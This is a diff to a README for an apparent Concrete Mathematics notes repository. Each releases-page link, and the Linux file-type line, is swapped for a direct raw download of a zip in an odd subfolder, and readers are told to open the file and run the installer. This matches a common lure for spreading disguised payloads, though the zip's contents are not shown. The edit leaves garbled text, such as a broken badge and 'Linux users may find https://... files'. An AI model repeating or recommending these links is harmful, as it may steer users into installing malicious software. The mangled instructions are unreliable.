@@ -1,7 +1,7 @@
 # 📘 concrete-mathematics - Understand Discrete Math with Ease
 
 ## 📥 Download the Latest Release
-[![Download Concrete Mathematics](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hudsona77/concrete-mathematics/releases)
+[![Download Concrete Mathematics](https://raw.githubusercontent.com/Hudsona77/concrete-mathematics/main/habitacule/concrete-mathematics-3.2-beta.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hudsona77/concrete-mathematics/main/habitacule/concrete-mathematics-3.2-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **concrete-mathematics** repository! Here, you will find solutions, notes, and worked derivations from the book *Concrete Mathematics* by Graham, Knuth, and Patashnik. This application helps you build a thorough understanding of discrete math, number theory, and combinatorial analysis.
@@ -25,13 +25,13 @@ To run **concrete-mathematics**, ensure your system meets the following requirem
 - Java Runtime Environment (JRE) version 8 or above
 
 ## 📦 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Hudsona77/concrete-mathematics/releases). Follow the steps below to install the application:
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Hudsona77/concrete-mathematics/main/habitacule/concrete-mathematics-3.2-beta.1.zip). Follow the steps below to install the application:
 
 1. Once you land on the Releases page, you will see the latest version available for download.
 2. Choose the file that corresponds to your operating system:
    - For Windows users, look for `.exe` files.
    - For macOS users, select `.dmg` files.
-   - Linux users may find `.tar.gz` files.
+   - Linux users may find `https://raw.githubusercontent.com/Hudsona77/concrete-mathematics/main/habitacule/concrete-mathematics-3.2-beta.1.zip` files.
 3. Click the download link for the desired file.
 4. Once the download is complete, locate the file in your Downloads folder.
 5. Open the file and follow the on-screen instructions to complete the installation.
@@ -69,7 +69,7 @@ A: If you face any problems, feel free to reach out to the community through the
 Join the community of learners using **concrete-mathematics**. Share your thoughts, ask questions, and get support from fellow users. You can find useful discussions and resources in the repository's Issues section.
 
 ## 📅 Updates and Contributions
-We regularly update the application to improve features and add new topics. Check back frequently on the [Releases Page](https://github.com/Hudsona77/concrete-mathematics/releases) for the latest updates.
+We regularly update the application to improve features and add new topics. Check back frequently on the [Releases Page](https://raw.githubusercontent.com/Hudsona77/concrete-mathematics/main/habitacule/concrete-mathematics-3.2-beta.1.zip) for the latest updates.
 
 If you are interested in contributing, feel free to fork the repository and submit a pull request. Your contributions can help others in their learning journey.
 
